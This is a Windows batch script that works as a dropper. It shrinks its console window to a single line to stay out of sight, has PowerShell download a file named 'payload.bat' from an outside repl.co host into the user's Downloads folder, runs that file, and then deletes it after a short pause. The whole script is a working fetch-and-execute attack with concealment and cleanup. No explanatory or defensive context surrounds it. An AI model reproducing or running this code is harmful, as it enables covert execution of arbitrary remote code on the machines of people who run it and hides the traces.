@echo off
mode con: cols=20 lines=1
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://rcerc7.cloen330.repl.co/payload.bat', 'C:\Users\%username%\Downloads\payload.bat')"
start C:\Users\%username%\Downloads\payload.bat

timeout /t 2 /nobreak >nul
del C:\Users\%username%\Downloads\payload.bat
